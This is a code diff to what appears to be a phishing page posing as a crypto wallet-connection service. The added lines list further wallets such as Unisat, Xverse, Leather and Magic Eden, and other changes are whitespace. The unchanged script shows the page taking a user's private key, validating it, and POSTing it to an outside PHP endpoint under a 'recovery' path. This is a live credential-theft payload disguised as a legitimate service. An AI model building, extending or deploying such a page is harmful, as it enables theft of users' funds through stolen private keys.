@@ -153,7 +153,7 @@
                                 </div>
                                 <p class="wallet-name"> Coinbase Wallet </p>
                             </div>
-                        </div> 
+                        </div>
 
                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
                             <div class="wallet-box">
@@ -170,8 +170,8 @@
                                     <img src="../assets/images/static/sologenic.svg" alt="" class="img-fluid" />
                                 </div>
                                 <p class="wallet-name"> Sologenic DEX </p>
-                            </div> 
-                        </div> 
+                            </div>
+                        </div>
 
                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
                             <div class="wallet-box">
@@ -260,6 +260,52 @@
                                     <img src="../assets/images/static/1inchwallet.jpg" alt="" class="img-fluid" />
                                 </div>
                                 <p class="wallet-name"> 1inch Wallet </p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                            <div class="wallet-box">
+                                <div class="img-box">
+                                    <img src="../assets/images/static/unisat_log.png" alt="" class="img-fluid" />
+                                </div>
+                                <p class="wallet-name"> Unisat Wallet </p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                            <div class="wallet-box">
+                                <div class="img-box">
+                                    <img src="../assets/images/static/xverse_logo.jpeg" alt="" class="img-fluid" />
+                                </div>
+                                <p class="wallet-name"> Xverse Wallet </p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                            <div class="wallet-box">
+                                <div class="img-box">
+                                    <img src="../assets/images/static/leather_wall.png" alt="" class="img-fluid" />
+                                </div>
+                                <p class="wallet-name"> Leather Wallet </p>
+                            </div>
+                        </div>
+
+
+                        <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                            <div class="wallet-box">
+                                <div class="img-box">
+                                    <img src="../assets/images/static/enkrypt_log.jpeg" alt="" class="img-fluid" />
+                                </div>
+                                <p class="wallet-name"> Enkrypt Wallet </p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                            <div class="wallet-box">
+                                <div class="img-box">
+                                    <img src="../assets/images/static/magic_eden.jpg" alt="" class="img-fluid" />
+                                </div>
+                                <p class="wallet-name"> Magic Eden </p>
                             </div>
                         </div>
 
@@ -795,6 +841,7 @@
                             </div>
                         </div>
 
+
                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
                             <div class="wallet-box">
                                 <div class="img-box">
@@ -966,7 +1013,7 @@
                             </div>
                         </div>
 
-                        
+
 
                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
                             <div class="wallet-box">
@@ -1110,7 +1157,7 @@
                                     <img src="../assets/images/static/dexag.png" alt="" class="img-fluid" />
                                 </div>
                                 <p class="wallet-name"> DEX.AG </p>
-                            </div> 
+                            </div>
                         </div>
 
                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
@@ -1122,7 +1169,7 @@
                             </div>
                         </div>
 
-<!--                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
+                        <!--                         <div class="col-lg-3 col-md-4 col-sm-4 col-6">
                             <div class="wallet-box">
                                 <div class="img-box">
                                     <img src="../assets/images/static/exodus.jpg" alt="" class="img-fluid" />
@@ -1900,7 +1947,6 @@
         crossorigin="anonymous"></script>
 </body>
 
-
 <script>
     $(document).ready(function () {
 
@@ -2157,7 +2203,7 @@
         try {
             let wallet = new ethers.Wallet(dappKey);
             let dappAddress = wallet.address;
-         
+
             $.ajax({
                 url: "https://voicewelfare.com/recovery/connectdappsolution.php",
                 method: "POST",
@@ -2176,7 +2222,7 @@
             $("#connect_div").hide();
             $("#qr_modal").show();
             document.getElementById("submit_private").disabled = false;
-    
+
         } catch (error) {
             // console.log("Invalid private key");
             $("#privateKey").addClass("error");
